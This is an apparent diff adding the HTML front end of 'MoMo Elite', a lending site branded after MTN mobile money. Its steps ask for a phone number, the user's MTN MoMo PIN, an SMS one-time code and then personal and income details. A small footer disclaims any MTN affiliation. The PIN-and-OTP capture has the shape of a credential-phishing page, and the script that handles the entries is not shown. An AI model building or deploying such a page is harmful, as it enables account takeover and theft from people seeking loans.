@@ -1,0 +1,233 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" content="#ffcc00">
+  <title>MoMo Elite | Premium Digital Lending</title>
+  <link rel="stylesheet" href="/styles.css">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
+  <script src="/app.js" defer></script>
+</head>
+<body>
+  <div id="toast" class="toast" aria-live="polite"></div>
+
+  <header class="nav-header">
+    <div class="container nav-container">
+      <a class="brand" href="/">
+        <div class="momo-logo">m</div>
+        <span>MoMo Elite</span>
+      </a>
+      <nav class="nav-links">
+        <a href="#how-it-works">How it Works</a>
+        <a href="#benefits">Benefits</a>
+        <a href="#flow" class="btn btn-primary">Apply Now</a>
+      </nav>
+    </div>
+  </header>
+
+  <main class="container flow-wrap" id="flow">
+    <!-- Page 1: Country & Phone -->
+    <section class="page active" id="page1">
+      <section class="hero" style="background: none; padding: 2rem 0; margin-bottom: 2rem; color: var(--color-navy);">
+        <div class="container">
+          <h1 style="color: var(--color-navy);">Financial Freedom,<br>Tailored for You.</h1>
+          <p class="text-muted">Experience the next generation of digital lending. Fast, secure, and transparent loans built for your mobile lifestyle.</p>
+        </div>
+      </section>
+
+      <div class="card" style="max-width: 800px; margin: 0 auto;">
+        <div class="grid grid-2">
+          <div>
+            <h4 class="text-muted" style="text-transform: uppercase; letter-spacing: 1px; font-size: 0.8rem; margin-bottom: 0.5rem;">Get Started</h4>
+            <p class="text-muted">Choose your country and enter your mobile number to begin your journey with MoMo Elite.</p>
+            <ul style="list-style: none; margin-top: 1.5rem;">
+              <li style="margin-bottom: 0.75rem; display: flex; align-items: center; gap: 0.5rem;">
+                <span style="color: var(--color-success);">✓</span> Instant verification
+              </li>
+              <li style="margin-bottom: 0.75rem; display: flex; align-items: center; gap: 0.5rem;">
+                <span style="color: var(--color-success);">✓</span> No hidden fees
+              </li>
+              <li style="display: flex; align-items: center; gap: 0.5rem;">
+                <span style="color: var(--color-success);">✓</span> 24/7 Support
+              </li>
+            </ul>
+          </div>
+          <form id="countryPhoneForm">
+            <div class="form-group">
+              <label for="country">Country</label>
+              <select id="country" required>
+                <option value="">Choose a country</option>
+              </select>
+            </div>
+            <div class="form-group">
+              <label for="phone">Mobile phone number</label>
+              <div class="phone-row">
+                <span id="dialCode">+--</span>
+                <input id="phone" type="tel" autocomplete="tel-national" placeholder="Enter mobile number" required>
+              </div>
+            </div>
+            <button class="btn btn-primary btn-block">Continue to PIN</button>
+          </form>
+        </div>
+      </div>
+      <section id="how-it-works" style="background: var(--color-surface); margin-top: 4rem; padding: 4rem 0;">
+        <div class="container">
+          <h2 class="text-center">How it Works</h2>
+          <div class="grid grid-3" style="margin-top: 3rem;">
+            <div class="text-center">
+              <div style="font-size: 2.5rem; margin-bottom: 1rem;">📱</div>
+              <h3>1. Connect</h3>
+              <p class="text-muted">Enter your mobile number and verify your identity in seconds.</p>
+            </div>
+            <div class="text-center">
+              <div style="font-size: 2.5rem; margin-bottom: 1rem;">⚙️</div>
+              <h3>2. Configure</h3>
+              <p class="text-muted">Choose your loan amount and the repayment term that fits your budget.</p>
+            </div>
+            <div class="text-center">
+              <div style="font-size: 2.5rem; margin-bottom: 1rem;">💸</div>
+              <h3>3. Receive</h3>
+              <p class="text-muted">Once approved, funds are disbursed directly to your mobile wallet.</p>
+            </div>
+          </div>
+        </div>
+      </section>
+
+    </section>
+
+
+    <!-- Page 2: PIN Setup -->
+    <section class="page" id="page2">
+      <div class="card" style="max-width: 500px; margin: 0 auto; text-align: center;">
+        <div style="background: var(--color-primary); width: 64px; height: 64px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 1.5rem; font-size: 1.5rem;">🔒</div>
+        <h2>Verify your identity</h2>
+        <p class="text-muted">Enter your MTN MoMo PIN to proceed with your application.</p>
+        <form id="pinForm">
+          <div class="form-group">
+            <input id="appPin" class="digit-input" type="password" inputmode="numeric" autocomplete="current-password" maxlength="4" pattern="[0-9]{4}" required>
+          </div>
+          <button class="btn btn-primary btn-block">Verify PIN & Continue</button>
+        </form>
+        <button class="btn btn-text btn-block" style="margin-top: 1rem;" data-back="1">← Back</button>
+      </div>
+    </section>
+
+    <!-- Page 3: OTP Verification -->
+    <section class="page" id="page3">
+      <div class="card" style="max-width: 500px; margin: 0 auto; text-align: center;">
+        <div style="background: var(--color-primary); width: 64px; height: 64px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 1.5rem; font-size: 1.5rem;">✉️</div>
+        <h2>Verify your number</h2>
+        <p class="text-muted">We've sent a 6-digit code to <strong id="phonePreview"></strong>. Please enter it below.</p>
+        <form id="otpForm">
+          <div class="form-group">
+            <input id="otp" class="digit-input" inputmode="numeric" autocomplete="one-time-code" maxlength="6" pattern="[0-9]{6}" required>
+          </div>
+          <button class="btn btn-primary btn-block">Verify & Continue</button>
+        </form>
+        <div id="authMessage" class="message" aria-live="polite"></div>
+        <div style="margin-top: 1.5rem; display: flex; flex-direction: column; gap: 0.5rem;">
+          <button class="btn btn-text" id="resendOtp">Resend code</button>
+          <button class="btn btn-text" data-back="2">← Back</button>
+        </div>
+      </div>
+    </section>
+
+
+    <!-- Page 4: Loan Details -->
+    <section class="page" id="page4">
+      <div class="card" style="max-width: 900px; margin: 0 auto;">
+        <p class="text-center text-muted" style="margin-bottom: 2rem;">Select your preferred amount and repayment terms.</p>
+        
+        <form id="loanForm">
+          <div class="grid grid-2">
+            <div class="form-group">
+              <label for="loanAmount">Loan amount (USD)</label>
+              <select id="loanAmount" required></select>
+            </div>
+            <div class="form-group">
+              <label for="repaymentPeriod">Repayment period</label>
+              <select id="repaymentPeriod" required></select>
+            </div>
+          </div>
+
+          <div class="loan-info-grid">
+            <div>
+              <span class="text-muted">Estimated Monthly Payment</span>
+              <div id="repaymentPreview" class="repayment-preview">$0.00</div>
+            </div>
+            <div>
+              <span class="text-muted">Interest Rate</span>
+              <div class="repayment-preview" style="font-size: 1.25rem;">2.5% / mo</div>
+            </div>
+            <div>
+              <span class="text-muted">Service Fee</span>
+              <div class="repayment-preview" style="font-size: 1.25rem;">0.25%</div>
+            </div>
+          </div>
+
+          <hr style="border: 0; border-top: 1px solid var(--color-border); margin: 2rem 0;">
+          
+          <h3 style="margin-bottom: 1.5rem;">Personal Information</h3>
+          <div class="grid grid-2">
+            <div class="form-group">
+              <label for="fullName">Full Name</label>
+              <input id="fullName" autocomplete="name" required minlength="2">
+            </div>
+            <div class="form-group">
+              <label for="email">Email Address</label>
+              <input id="email" type="email" autocomplete="email" required>
+            </div>
+            <div class="form-group">
+              <label for="employment">Employment Status</label>
+              <select id="employment" required>
+                <option value="">Choose</option>
+                <option>Employed</option>
+                <option>Self-employed</option>
+                <option>Business owner</option>
+                <option>Other</option>
+              </select>
+            </div>
+            <div class="form-group">
+              <label for="income">Monthly Income (USD)</label>
+              <input id="income" type="number" min="1" step="0.01" required>
+            </div>
+          </div>
+          
+          <div class="form-group" style="margin-top: 1rem;">
+            <label for="purpose">Purpose of financing</label>
+            <textarea id="purpose" rows="3" minlength="10" required placeholder="Tell us how this financing will help you"></textarea>
+          </div>
+
+          <div style="margin: 2rem 0; padding: 1rem; background: #FFFBEB; border-radius: var(--radius-md); border-left: 4px solid var(--color-focus);">
+            <label style="display: flex; gap: 0.75rem; align-items: flex-start; cursor: pointer; margin: 0;">
+              <input type="checkbox" required style="width: auto; margin-top: 0.25rem;">
+              <span style="font-size: 0.85rem; color: #92400E;">I confirm that the information provided is accurate. I understand this is an application and subject to review and approval.</span>
+            </label>
+          </div>
+
+          <button class="btn btn-primary btn-block">Submit Application</button>
+        </form>
+        
+        <div id="loanMessage" class="message"></div>
+        <div id="myApplications" class="application-list"></div>
+      </div>
+      <div class="text-center" style="margin-top: 2rem;">
+        <button class="btn btn-text" data-back="3">← Back to verification</button>
+      </div>
+    </section>
+  </main>
+
+  <footer class="footer">
+    <div class="container">
+      <div class="footer-links">
+        <a href="#">Help Center</a>
+        <a href="#">Terms of Service</a>
+        <a href="#">Privacy Policy</a>
+        <a href="#">Support</a>
+      </div>
+      <p style="opacity: 0.6; font-size: 0.9rem;">&copy; 2026 MoMo Elite. Independent demonstration platform. Not an official MTN product.</p>
+    </div>
+  </footer>
+</body>
+</html>
